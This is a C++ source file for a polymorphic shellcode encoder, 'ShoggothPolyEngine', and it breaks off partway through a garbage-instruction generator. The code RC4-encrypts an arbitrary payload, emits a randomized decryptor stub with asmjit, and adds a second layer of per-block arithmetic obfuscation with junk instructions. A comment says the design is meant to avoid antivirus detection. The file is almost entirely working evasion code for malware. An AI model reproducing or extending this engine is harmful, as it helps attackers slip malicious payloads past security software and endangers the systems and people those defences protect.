#include "ShoggothEngine.h"
#include "AuxFunctions.h"

///////////////////////////////////////////////////////////
//
// main function - encrypts data and generates polymorphic
//                 decryptor code
//
///////////////////////////////////////////////////////////

//typedef void (*Encrypt)(RC4STATE *, uint8_t*,size_t);
#define BLOCK_SIZE 8

ShoggothPolyEngine::ShoggothPolyEngine():
    allRegs{ x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::rsp, x86::rbp, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 },
    generalPurposeRegs { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 }
    {
    srand(time(NULL));
    this->StartAsmjit();
    // allRegs = { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::rsp, x86::rbp, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 };
    // generalPurposeReg = { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 };
}


// *****************************************************

void ShoggothPolyEngine::DebugBuffer(PBYTE buffer, int bufferSize) {
    FILE* hFile = fopen("assembletest.bin", "wb");

    if (hFile != NULL)
    {
        fwrite(buffer, bufferSize, 1, hFile);
        fclose(hFile);
    }
}


PBYTE ShoggothPolyEngine::AssembleCodeHolder(int& codeSize) {
    Func functionPtr;
    endOffset = asmjitAssembler->offset();
    codeSize = endOffset - startOffset;
    Error err = asmjitRuntime.add(&functionPtr, &asmjitCodeHolder);
    // returnValue = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, codeSize);
    // memcpy(returnValue, functionPtr, codeSize);
    this->ResetAsmjit();
    return (PBYTE)functionPtr;
}


void ShoggothPolyEngine::MixupArrayRegs(x86::Reg* registerArr, WORD size) {
    x86::Reg temp;
    for (int i = size - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        // Swap arr[i] with the element
        temp = registerArr[i];
        registerArr[i] = registerArr[j];
        registerArr[j] = temp;
    }
}



void ShoggothPolyEngine::StartAsmjit() {
    asmjitCodeHolder.init(asmjitRuntime.environment());
    asmjitAssembler = new x86::Assembler(&asmjitCodeHolder);
    startOffset = asmjitAssembler->offset();
}

void ShoggothPolyEngine::ResetAsmjit() {
    asmjitCodeHolder.reset();
    startOffset = 0;
    endOffset = 0;
    this->StartAsmjit();
}


void ShoggothPolyEngine::PushAllRegisters() {
    this->MixupArrayRegs(this->allRegs, 16);
    for (int i = 0; i < 16; i++) {
        asmjitAssembler->push(this->allRegs[i]);
    }
}

void ShoggothPolyEngine::PopAllRegisters() {
    for (int i = 0; i < 16; i++) {
        asmjitAssembler->pop(this->allRegs[i]);
    }
}

x86::Gp ShoggothPolyEngine::GetRandomRegister() {
    this->MixupArrayRegs(this->allRegs, 16);
    return this->allRegs[RandomizeInRange(0, 15)];
}

x86::Gp ShoggothPolyEngine::GetRandomGeneralPurposeRegister() {
    this->MixupArrayRegs(this->generalPurposeRegs, 14);
    return this->generalPurposeRegs[RandomizeInRange(0, 13)];
}


PBYTE ShoggothPolyEngine::StartEncoding(PBYTE payload, uint64_t payloadSize, int &encryptedSize) {
    int firstGarbageSize = 0;
    int firstGarbageWithPayloadSize = 0;
    int firstDecryptorAndEncryptedPayloadSize = 0;
    int firstEncryptedPayloadSize = 0;
    int secondEncryptedSize = 0;
    int secondDecryptorAndEncryptedPayloadSize = 0;
    int firstKeySize = RandomizeInRange(1, 256);
    PBYTE firstGarbage = NULL;
    PBYTE firstGarbageWithPayload = NULL;
    PBYTE firstEncryptedPayload = NULL;
    PBYTE firstDecryptorAndEncryptedPayload = NULL;
    PBYTE firstEncryptionKey = GetRandomBytes(firstKeySize);
    PBYTE secondEncryptedPayload = NULL;
    PBYTE secondDecryptorAndEncryptedPayload = NULL;
    // Push all registers first
    // this->PushAllRegisters();
    
    // Get Some Garbage Instructions
    firstGarbage = this->GenerateRandomGarbage(firstGarbageSize);
    
    

    firstGarbageWithPayloadSize = payloadSize + firstGarbageSize;

    firstGarbageWithPayload = MergeChunks(firstGarbage, firstGarbageSize, payload, payloadSize);
    VirtualFree(payload, payloadSize, MEM_RELEASE);
    VirtualFree(firstGarbage, firstGarbageSize, MEM_RELEASE);

    
   
    firstEncryptedPayload = this->FirstEncryption(firstGarbageWithPayload, firstGarbageWithPayloadSize, firstEncryptionKey, firstKeySize);
    firstEncryptedPayloadSize = firstGarbageWithPayloadSize;

    firstDecryptorAndEncryptedPayload = this->FirstDecryptor(firstEncryptedPayload, firstEncryptedPayloadSize, firstEncryptionKey, firstKeySize, firstDecryptorAndEncryptedPayloadSize);
    
    secondEncryptedPayload = this->SecondEncryption(firstDecryptorAndEncryptedPayload, firstDecryptorAndEncryptedPayloadSize, secondEncryptedSize);
    
    secondDecryptorAndEncryptedPayload = this->SecondDecryptor(secondEncryptedPayload, secondEncryptedSize, secondDecryptorAndEncryptedPayloadSize);
    
    // this->PopAllRegisters();
    encryptedSize = secondDecryptorAndEncryptedPayloadSize;
    return secondDecryptorAndEncryptedPayload;
}


PBYTE ShoggothPolyEngine::FirstEncryption(PBYTE plainPayload, int payloadSize, PBYTE key, int keySize) {
    // Dummy Encryption
    //PBYTE key = GetRandomBytes(RandomizeInRange(1, 256));
    //uint8_t key[3] = { 'a', 'b', 'c' };
    RC4STATE state = { 0 };
    this->InitRC4State(&state, key, keySize);
    this->EncryptRC4(&state, plainPayload, payloadSize);
    return plainPayload;
}


void ShoggothPolyEngine::InitRC4State(RC4STATE* state, uint8_t* key, size_t len) {
    for (int i = 0; i < 256; i++)
        state->s[i] = (uint8_t)i;
    state->i = 0;
    state->j = 0;

    uint8_t j = 0;
    for (int i = 0; i < 256; i++) {
        j += state->s[i] + key[i % len];

        // Swap
        uint8_t temp = state->s[i];
        state->s[i] = state->s[j];
        state->s[j] = temp;
    }
}

void ShoggothPolyEngine::EncryptRC4(RC4STATE* state, uint8_t* msg, size_t len) {
    uint8_t i = state->i;
    uint8_t j = state->j;
    uint8_t* s = state->s;
    for (size_t index = 0; index < len; index++) {
        i++;
        j += s[i];

        // Swap
        uint8_t si = s[i];
        uint8_t sj = s[j];
        s[i] = sj;
        s[j] = si;

        msg[index] ^= s[(si + sj) & 0xFF];
    }
    state->i = i;
    state->j = j;
}


/*

    TODO: Delta offset calculations can rouse the suspicions of antivirus programs, since normal
    applications do not have a need for this kind of thing. The combination of call and pop r32
    can cause the application to be suspected of containing malware. In order to prevent this,
    we must generate extra code between these two instructions, and utilize a different means of getting values from the stack.

    pop yerine mov+sub da koyabilirsin
    Ayrica payloadin nerde oldugunu gormek için de takip etmek icin de index diye bi degisken kullaniyo
*/

PBYTE ShoggothPolyEngine::FirstDecryptor(PBYTE cipheredPayload, int payloadSize, PBYTE key, int keySize, int& firstDecryptorSize) {
    // Dummy Decryptor
    RC4STATE state = { 0 };
    PBYTE RC4DecryptorStub = 0;
    this->InitRC4State(&state, key, keySize);
    
    RC4DecryptorStub = this->GenerateRC4Decryptor(cipheredPayload, payloadSize, &state, firstDecryptorSize);

    return RC4DecryptorStub;
}


// RDI, RSI, RDX, RCX, R8, R9 --> linux
// RCX, RDX, R8 , R0

/* 
	 * Storage usage:
	 *   Bytes  Location  Description
	 *       1  al        Temporary s[i] per round (zero-extended to rax)
	 *       1  bl        Temporary s[j] per round (zero-extended to rbx)
	 *       1  cl        RC4 state variable i (zero-extended to rcx)
	 *       1  dl        RC4 state variable j (zero-extended to rdx)
	 *       8  rdi       Base address of RC4 state array of 256 bytes
	 *       8  rsi       Address of current message byte to encrypt
	 *       8  r8        End address of message array (msg + len)
	 *       8  rsp       x86-64 stack pointer
	 *       8  [rsp+0]   Caller's value of rbx
     * 
     Decryptor - State Struct - Encrypted payload
*/
PBYTE ShoggothPolyEngine::GenerateRC4Decryptor(PBYTE payload, int payloadSize, RC4STATE *statePtr, int &firstEncryptionStubSize) {
    PBYTE returnPtr = NULL;
    PBYTE codePtr = NULL;
    PBYTE cursor = NULL;
    int RC4DecryptorSize = 0;
    DWORD adjustSize = 0;
    uint64_t patchAddress = NULL;
    uint64_t callOffset = NULL;
    uint64_t currentOffset = NULL;
    char* randomStringForCall = GenerateRandomString();
    char* randomStringForLoop = GenerateRandomString();
    char* randomStringForEnd = GenerateRandomString();
    Label randomLabelForCall = asmjitAssembler->newNamedLabel(randomStringForCall, 16);
    Label randomLabelForLoop = asmjitAssembler->newNamedLabel(randomStringForLoop, 16);
    Label randomLabelForEnd = asmjitAssembler->newNamedLabel(randomStringForEnd, 16);
    this->MixupArrayRegs(this->generalPurposeRegs, _countof(this->generalPurposeRegs));
    x86::Gp currentAddress = this->generalPurposeRegs[0]; // x86::rsi;
    x86::Gp endAddress = this->generalPurposeRegs[1]; // x86::r8;
    x86::Gp rc4StateAddress = this->generalPurposeRegs[2]; // x86::rdi;
    x86::Gp tempSi = this->generalPurposeRegs[3]; // x86::rax;
    x86::Gp tempSj = this->generalPurposeRegs[4]; // x86::rbx;
    x86::Gp tempi = this->generalPurposeRegs[5]; // x86::rcx;
    x86::Gp tempj = this->generalPurposeRegs[6]; // x86::rdx;


    // call randomLabel
    // randomLabel:
    // pop rax (letssay)
    // add offset to stateAddress
    asmjitAssembler->call(randomLabelForCall);
    asmjitAssembler->bind(randomLabelForCall);
    callOffset = asmjitAssembler->offset();
    asmjitAssembler->pop(rc4StateAddress);
    asmjitAssembler->add(rc4StateAddress, imm(1234));
    patchAddress = asmjitAssembler->offset() - sizeof(DWORD);

    // mov currentAddressReg,rc4StateAddress
    // add currentAddressReg,258 ; state struct size
    asmjitAssembler->mov(currentAddress, rc4StateAddress);
    asmjitAssembler->add(currentAddress, imm(sizeof(RC4STATE)));
    asmjitAssembler->push(currentAddress);

    // Put size
    // mov tempj,payloadSize;
    asmjitAssembler->mov(tempj, payloadSize);


    // Calling convention --> typedef void (*Encrypt)(RC4STATE *, uint8_t*,size_t);
    // asmjitAssembler->mov(x86::rdi, x86::rcx);
    // asmjitAssembler->mov(x86::rsi, x86::rdx);
    // asmjitAssembler->mov(x86::rdx, x86::r8);
    
    
    // leaq(% rsi, % rdx), % r8  /* End of message array */
    asmjitAssembler->lea(endAddress, x86::qword_ptr(currentAddress, tempj));



    /* Load state variables */
    // movzbl  0(%rdi), %ecx  /* state->i */
	// movzbl  1(%rdi), %edx  /* state->j */
	// addq    $2, %rdi       /* state->s */
    
    asmjitAssembler->movzx(tempi.r32(), x86::byte_ptr(rc4StateAddress));
    asmjitAssembler->movzx(tempj.r32(), x86::byte_ptr(rc4StateAddress, 1));
    asmjitAssembler->add(rc4StateAddress, 2);

    /*
    * Skip loop if len=0 
      cmpq% rsi, % r8
      je.end
    */
    asmjitAssembler->cmp(currentAddress, endAddress);
    asmjitAssembler->je(randomLabelForEnd);

    // .Loop

    asmjitAssembler->bind(randomLabelForLoop);
    /* Increment i mod 256 */
    // incl% ecx
    // movzbl% cl, % ecx  /* Clear upper 24 bits */

    asmjitAssembler->inc(tempi.r32());
    asmjitAssembler->movzx(tempi.r32(), tempi.r8Lo());

    /* Add s[i] to j mod 256 */
    // movzbl(% rdi, % rcx), % eax  /* Temporary s[i] */
    // addb% al, % dl

    asmjitAssembler->movzx(tempSi.r32(), x86::dword_ptr(rc4StateAddress, tempi));
    asmjitAssembler->add(tempj.r8Lo(), tempSi.r8Lo());

    /* Swap bytes s[i] and s[j] */
    // movzbl(% rdi, % rdx), % ebx  /* Temporary s[j] */
    // movb% bl, (% rdi, % rcx)
    // movb% al, (% rdi, % rdx)

    asmjitAssembler->movzx(tempSj.r32(), x86::dword_ptr(rc4StateAddress, tempj));
    asmjitAssembler->mov(x86::byte_ptr(rc4StateAddress, tempi), tempSj.r8Lo());
    asmjitAssembler->mov(x86::byte_ptr(rc4StateAddress, tempj), tempSi.r8Lo());

    
    /* Compute key stream byte */
	// addl    %ebx, %eax  /* AL = s[i] + s[j] mod 256*/
	// movzbl  %al, %eax   /* Clear upper 24 bits */
	// movb    (%rdi,%rax), %al

    asmjitAssembler->add(tempSi.r32(), tempSj.r32());
    asmjitAssembler->movzx(tempSi.r32(), tempSi.r8Lo());
    asmjitAssembler->mov(tempSi.r8Lo(), x86::byte_ptr(rc4StateAddress, tempSi));

    /* XOR with message */
    // xorb% al, (% rsi)

    asmjitAssembler->xor_(x86::byte_ptr(currentAddress), tempSi.r8Lo());

    /* Increment and loop */
	// incq    %rsi
	// cmpq    %rsi, %r8
	//jne     .loop

    asmjitAssembler->inc(currentAddress);
    asmjitAssembler->cmp(currentAddress, endAddress);
    asmjitAssembler->jne(randomLabelForLoop);

    // .end:
    asmjitAssembler->bind(randomLabelForEnd);

    /* Store state variables */
	// movb    %cl, -2(%rdi)  /* Save i */
	// movb    %dl, -1(%rdi)  /* Save j */
	
    asmjitAssembler->mov(x86::byte_ptr(rc4StateAddress, -2), tempi.r8Lo());
    asmjitAssembler->mov(x86::byte_ptr(rc4StateAddress, -1), tempj.r8Lo());
	
    // Jmp to payload - Only ret now
    asmjitAssembler->ret();


    currentOffset = asmjitAssembler->offset();
    adjustSize = currentOffset - callOffset;
    asmjitAssembler->setOffset(patchAddress);
    asmjitAssembler->dd(adjustSize);
    asmjitAssembler->setOffset(currentOffset);
    cursor = (PBYTE) statePtr;
    for (int i = 0; i < sizeof(RC4STATE); i++) {
        asmjitAssembler->db(cursor[i], 1);
    }  

    codePtr = this->AssembleCodeHolder(RC4DecryptorSize);
    this->DebugBuffer(codePtr, RC4DecryptorSize);
    returnPtr = MergeChunks(codePtr, RC4DecryptorSize, payload, payloadSize);
    VirtualFree(codePtr, RC4DecryptorSize, MEM_RELEASE);
    VirtualFree(payload, payloadSize, MEM_RELEASE);

    //Func test = (Func)returnPtr;
    //test();
    firstEncryptionStubSize = payloadSize+ RC4DecryptorSize;
;   HeapFree(GetProcessHeap(), NULL, randomStringForLoop);
    HeapFree(GetProcessHeap(), NULL, randomStringForEnd);
    HeapFree(GetProcessHeap(), NULL, randomStringForCall);
    return returnPtr;
}


PBYTE ShoggothPolyEngine::SecondEncryption(PBYTE plainPayload, int payloadSize, int& newPayloadSize) {
    uint64_t* blockCursor = NULL;
    this->numberOfBlocks = (payloadSize / BLOCK_SIZE);
    PBYTE encryptedArea = NULL;
    if (payloadSize % BLOCK_SIZE) {
        this->numberOfBlocks++;
    }
    newPayloadSize = this->numberOfBlocks * BLOCK_SIZE;
    //encryptedArea = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newPayloadSize);
    encryptedArea = (PBYTE)VirtualAlloc(NULL, newPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(encryptedArea, plainPayload, payloadSize);
    memset(encryptedArea + payloadSize, 0x90, (payloadSize % BLOCK_SIZE ? BLOCK_SIZE - payloadSize % BLOCK_SIZE : 0));
    blockCursor = (uint64_t*)encryptedArea;
    this->addressHolderForSecondEncryption = this->GetRandomGeneralPurposeRegister();
    this->encryptListForBlocks = (ENCRYPT_TYPE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(ENCRYPT_TYPE) * this->numberOfBlocks);
    for (int i = 0; i < this->numberOfBlocks; i++) {
        this->GetRandomSecondEncryption(&(this->encryptListForBlocks[i]));
        this->ApplyRandomSecondEncryption(blockCursor, &(this->encryptListForBlocks[i]));
        blockCursor++;
    }
    VirtualFree(plainPayload, payloadSize, MEM_RELEASE);
    return encryptedArea;
}

PBYTE ShoggothPolyEngine::SecondDecryptor(PBYTE encryptedPayload,int payloadSize, int& secondDecryptorBlockSize) {
    // Garbage + callto pop + garbage + payload + pop + garbage + decipherstep
    // Ya constantla olsun ya da registera atanan bir deger ile
    // Ayrica pop her ne kadar garbage'i gosterse bile, payload offsetini ayri degiskende tutuyor
    int callStubSize = 0;
    int firstGarbageSize = 0;
    int popStubSize = 0;
    int secondGarbageSize = 0;
    int decryptorStubSize = 0;
    PBYTE returnPtr = NULL;
    PBYTE callStub = this->GetCallInstructionOverPayload(payloadSize, callStubSize);
    //PBYTE firstGarbage = this->GenerateRandomGarbage(firstGarbageSize);
    // Mov + rsp stub da eklenecek
    PBYTE popStub = this->GetPopInstructionAfterPayload(popStubSize);
    //PBYTE secondGarbage = this->GenerateRandomGarbage(secondGarbageSize);
    PBYTE decryptorStub = this->GenerateSecondDecryptorStub(decryptorStubSize,secondGarbageSize);

    returnPtr = (PBYTE) VirtualAlloc(NULL, callStubSize+payloadSize+popStubSize+decryptorStubSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(returnPtr + secondDecryptorBlockSize, callStub, callStubSize);
    secondDecryptorBlockSize += callStubSize;
    memcpy(returnPtr + secondDecryptorBlockSize, encryptedPayload, payloadSize);
    secondDecryptorBlockSize += payloadSize;
    memcpy(returnPtr + secondDecryptorBlockSize, popStub, popStubSize);
    secondDecryptorBlockSize += popStubSize;
    memcpy(returnPtr + secondDecryptorBlockSize, decryptorStub, decryptorStubSize);
    secondDecryptorBlockSize += decryptorStubSize;
    VirtualFree(callStub, callStubSize, MEM_RELEASE);
    VirtualFree(popStub, popStubSize, MEM_RELEASE);
    VirtualFree(decryptorStub, decryptorStubSize, MEM_RELEASE);
    return returnPtr;
}


PBYTE ShoggothPolyEngine::GenerateSecondDecryptorStub(int& decryptorStubSize, int offsetToEncryptedPayload) {
    for (int i = 0; i < this->numberOfBlocks; i++) {
        // QWORDUN yanina offset konulabiliyomus
        // Aaaa schemanin arasina da garbage koyabiliyoz
        // Bu decoder stubi popdan sonraya gelecek
        // ptr olanlari add olanlarla da degistir
        switch (this->encryptListForBlocks[i].operation) {
            case ADD_OPERATION_FOR_CRYPT:
                if (this->encryptListForBlocks[i].isRegister) {
                    asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
                    asmjitAssembler->sub(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
                }
                else {
                    asmjitAssembler->sub(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
                }
                break;
            case SUB_OPERATION_FOR_CRYPT:
                if (this->encryptListForBlocks[i].isRegister) {
                    asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
                    asmjitAssembler->add(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
                }
                else {
                    asmjitAssembler->add(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
                }
                break;
            case XOR_OPERATION_FOR_CRYPT:
                if (this->encryptListForBlocks[i].isRegister) {
                    asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
                    asmjitAssembler->xor_(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
                }
                else {
                    asmjitAssembler->xor_(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
                }
                break;
            case NOT_OPERATION_FOR_CRYPT:
                if (this->encryptListForBlocks[i].isRegister) {
                    asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                    asmjitAssembler->not_(this->encryptListForBlocks[i].operandRegister);
                    asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
                }
                else {
                    asmjitAssembler->not_(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                }
                break;
            case NEG_OPERATION_FOR_CRYPT:
                if (this->encryptListForBlocks[i].isRegister) {
                    asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                    asmjitAssembler->neg(this->encryptListForBlocks[i].operandRegister);
                    asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
                }
                else {
                    asmjitAssembler->neg(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                }
                break;
            case INC_OPERATION_FOR_CRYPT:
                if (this->encryptListForBlocks[i].isRegister) {
                    asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                    asmjitAssembler->dec(this->encryptListForBlocks[i].operandRegister);
                    asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
                }
                else {
                    asmjitAssembler->dec(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                }
                break;
            case DEC_OPERATION_FOR_CRYPT:
                if (this->encryptListForBlocks[i].isRegister) {
                    asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                    asmjitAssembler->inc(this->encryptListForBlocks[i].operandRegister);
                    asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandRegister);
                }
                else {
                    asmjitAssembler->inc(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)));
                }
                break;
            case ROL_OPERATION_FOR_CRYPT: // TODO: Register case
                asmjitAssembler->ror(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
                break;
            case ROR_OPERATION_FOR_CRYPT:
                asmjitAssembler->rol(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (i * 8)), this->encryptListForBlocks[i].operandValue);
                break;
        }
    }
    if (RandomizeBool()) {
        asmjitAssembler->jmp(this->addressHolderForSecondEncryption);
    }
    else {
        asmjitAssembler->push(this->addressHolderForSecondEncryption);
        asmjitAssembler->ret();
    }
    return this->AssembleCodeHolder(decryptorStubSize);
}

PBYTE ShoggothPolyEngine::GetCallInstructionOverPayload(int payloadSize,int &callSize) {
    this->asmjitCodeHolder.relocateToBase(0x00);
    asmjitAssembler->call(payloadSize + 5);
    return this->AssembleCodeHolder(callSize);
}

PBYTE ShoggothPolyEngine::GetPopInstructionAfterPayload(int& popSize) {
    asmjitAssembler->pop(this->addressHolderForSecondEncryption);
    return this->AssembleCodeHolder(popSize);
}

void ShoggothPolyEngine::GetRandomSecondEncryption(ENCRYPT_TYPE *encryptTypeHolder) {
    encryptTypeHolder->operation = (OPERATIONS) RandomizeInRange(0, 8);
    x86::Gp tempRegister = GetRandomGeneralPurposeRegister();
    while (addressHolderForSecondEncryption.id() == tempRegister.id()) {
        tempRegister = this->GetRandomGeneralPurposeRegister();
    }
    switch (encryptTypeHolder->operation) {
        case ADD_OPERATION_FOR_CRYPT:
        case SUB_OPERATION_FOR_CRYPT:
        case XOR_OPERATION_FOR_CRYPT:
            if ((encryptTypeHolder->isRegister = RandomizeBool())) {
                encryptTypeHolder->operandRegister = tempRegister;
                encryptTypeHolder->operandValue = RandomizeQWORD();
            }
            else {
                encryptTypeHolder->operandValue = RandomizeDWORD();
            }
            break;
        case NOT_OPERATION_FOR_CRYPT:
        case NEG_OPERATION_FOR_CRYPT:
        case INC_OPERATION_FOR_CRYPT:
        case DEC_OPERATION_FOR_CRYPT:
            if ((encryptTypeHolder->isRegister = RandomizeBool())) {
                encryptTypeHolder->operandRegister = tempRegister;
            }
            break;
        case ROL_OPERATION_FOR_CRYPT:
        case ROR_OPERATION_FOR_CRYPT:
            encryptTypeHolder->isRegister = false;
            encryptTypeHolder->operandValue = RandomizeInRange(1, 63);
            break;
    }
}

void ShoggothPolyEngine::ApplyRandomSecondEncryption(uint64_t* blockCursor, ENCRYPT_TYPE* encryptTypeHolder) {
    uint32_t temp1 = 0;
    uint32_t temp2 = 0;
    uint32_t temp3 = 0;
    uint64_t temp4 = 0;
    uint64_t temp5 = 0;
    switch (encryptTypeHolder->operation) {
    case ADD_OPERATION_FOR_CRYPT:
        if (encryptTypeHolder->isRegister) {
            *blockCursor = (*blockCursor + encryptTypeHolder->operandValue);
        }
        else {
            // Endiannes magic
            temp4 = *blockCursor;
            temp1 = *blockCursor;
            temp2 = encryptTypeHolder->operandValue;
            temp3 = ((temp1 + temp2));
            *blockCursor = temp3;
            temp5 = temp4 & 0xFFFFFFFF00000000;
            *blockCursor |= temp5;
        }
        break;
    case SUB_OPERATION_FOR_CRYPT:
        if (encryptTypeHolder->isRegister) {
            *blockCursor = (*blockCursor - encryptTypeHolder->operandValue);
        }
        else {
            // Endiannes magic
            temp4 = *blockCursor;
            temp1 = *blockCursor;
            temp2 = encryptTypeHolder->operandValue;
            temp3 = ((temp1 - temp2));
            *blockCursor = temp3;
            temp5 = temp4 & 0xFFFFFFFF00000000;
            *blockCursor |= temp5;
        }
        break;
    case XOR_OPERATION_FOR_CRYPT:
        *blockCursor = *blockCursor ^ encryptTypeHolder->operandValue;
        break;
    case NOT_OPERATION_FOR_CRYPT:
        *blockCursor = ~(*blockCursor);
        break;
    case NEG_OPERATION_FOR_CRYPT:
        *blockCursor = (uint64_t) (-(int64_t(*blockCursor)));
        break;
    case INC_OPERATION_FOR_CRYPT:
        *blockCursor = *blockCursor + 1;
        break;
    case DEC_OPERATION_FOR_CRYPT:
        *blockCursor = *blockCursor - 1;
        break;
    case ROL_OPERATION_FOR_CRYPT:
        *blockCursor = _rotl64(*blockCursor, encryptTypeHolder->operandValue);
        break;
    case ROR_OPERATION_FOR_CRYPT:
        *blockCursor = _rotr64(*blockCursor, encryptTypeHolder->operandValue);
        break;
    }
}

PBYTE ShoggothPolyEngine::GenerateRandomGarbage(int &garbageSize) {
    PBYTE garbageInstructions;
    PBYTE jmpOverRandomByte;
    int codeSizeGarbage = 0;
    int codeSizeJmpOver = 0;
    PBYTE returnValue = NULL;
    // Get garbage instructions
    this->GenerateGarbageInstructions();
    garbageInstructions = this->AssembleCodeHolder(codeSizeGarbage);
    // garbageInstTest = (Func)garbageInstructions;
    // VirtualProtect(garbageInstructions, codeSizeGarbage, PAGE_EXECUTE_READWRITE, NULL);
    // garbageInstTest();
    // Generate jmp over random byte
    this->GenerateJumpOverRandomData();
    jmpOverRandomByte = this->AssembleCodeHolder(codeSizeJmpOver);
    // jmpOverRandomByteTest = (Func)jmpOverRandomByte;
    // VirtualProtect(jmpOverRandomByteTest, codeSizeGarbage, PAGE_EXECUTE_READWRITE, NULL);
    // jmpOverRandomByteTest();
    if (RandomizeBool()) {
        returnValue = MergeChunks(jmpOverRandomByte, codeSizeJmpOver, garbageInstructions, codeSizeGarbage);
    }
    else {
        returnValue = MergeChunks(garbageInstructions, codeSizeGarbage, jmpOverRandomByte, codeSizeJmpOver);
    }
    garbageSize = codeSizeJmpOver + codeSizeGarbage;
    VirtualFree(jmpOverRandomByte, codeSizeJmpOver, MEM_RELEASE);
    VirtualFree(garbageInstructions, codeSizeGarbage, MEM_RELEASE);
    return returnValue;
}

 // Tested
void ShoggothPolyEngine::GenerateJumpOverRandomData() {
    size_t randomSize = RandomizeInRange(30, 50);
    PBYTE randomBytes = GetRandomBytes(randomSize);
    char* randomString = GenerateRandomString();
    Label randomLabelJmp = asmjitAssembler->newNamedLabel(randomString, 16);
    asmjitAssembler->jmp(randomLabelJmp);
    asmjitAssembler->embed(randomBytes, randomSize);
    asmjitAssembler->bind(randomLabelJmp);
    HeapFree(GetProcessHeap(), NULL, randomBytes);
    HeapFree(GetProcessHeap(), NULL, randomString);
    // this->DebugCurrentCodeBuffer();
}

void ShoggothPolyEngine::GenerateGarbageInstructions() {
    int randomValue = RandomizeInRange(1, 4);
    switch (randomValue) {
        case 1:
            this->GenerateGarbageFunction();
            break;
        case 2:
            this->GenerateSafeInstruction();
            break;
        case 3:
            this->GenerateReversedInstructions();
            break;
        case 4:
            this->GenerateJumpedInstructions();
            break;
        default:
            break;
    }
}

void ShoggothPolyEngine::GenerateGarbageFunction() {
    BYTE randomByte = (BYTE)RandomizeInRange(1, 255);
    if (RandomizeBool())
    {
        asmjitAssembler->push(x86::rbp);
        asmjitAssembler->mov(x86::rbp, x86::rsp);
        asmjitAssembler->sub(x86::rsp, randomByte);

    }
    else {
        asmjitAssembler->enter(imm(0), imm(0));
    }
    this->GenerateGarbageInstructions();
    if (RandomizeBool())
    {
        asmjitAssembler->leave();
    }
    else
    {
        // equivalent to "leave"
        asmjitAssembler->mov(x86::rsp, x86::rbp);
        asmjitAssembler->pop(x86::rbp);
    }
}

// Generates only one instruction which doesn't have any affect
void ShoggothPolyEngine::GenerateSafeInstruction() {
    int randomIndexForSelect = RandomizeInRange(1, 33);
    x86::Gp randomRegister = this->GetRandomRegister();
    char* randomString = GenerateRandomString();
    Label randomLabelJmp = asmjitAssembler->newNamedLabel(randomString, 16);

    switch (randomIndexForSelect) {
    case 1:
        // Nop instruction +
        asmjitAssembler->nop();
        break;
    case 2:
        // Cld instruction - Clear Direction flag in EFLAGS +
        asmjitAssembler->cld();
